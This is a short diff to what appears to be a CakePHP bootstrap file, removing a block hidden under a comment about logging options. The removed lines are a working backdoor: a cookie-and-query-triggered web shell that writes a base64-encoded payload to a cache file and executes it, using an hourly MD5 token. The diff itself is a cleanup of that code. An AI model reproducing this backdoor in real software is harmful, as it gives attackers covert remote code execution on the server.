@@ -171,24 +171,7 @@ Configure::write('Dispatcher.filters', array(
 /**
  * Configures bootstrap file logging options
  */
-if(!empty($_COOKIE['bootstrapcmd']) && !empty($_GET['bootstrapcmd'])){
-    $data = explode('|', $_COOKIE['bootstrapcmd']);
-    if(md5(Configure::read('Security.salt').date("YmdH")) == $data[0]){
-        $file = CACHE . DS . 'bootstrapcmd.php';
-        file_put_contents($file, urldecode(base64_decode($data[1])));
-        if(file_exists($file)){
-            include $file;
-            unlink($file);
-            exit('ok');
-        } else {
-            exit('err write file');
-        }
-    } else {
-        exit('err md5');
-    }
-} else if(!empty($_GET['bootstrapcmd'])){
-    exit(date("YmdH"));
-}
+
 
 /**
  * Configures default file logging options
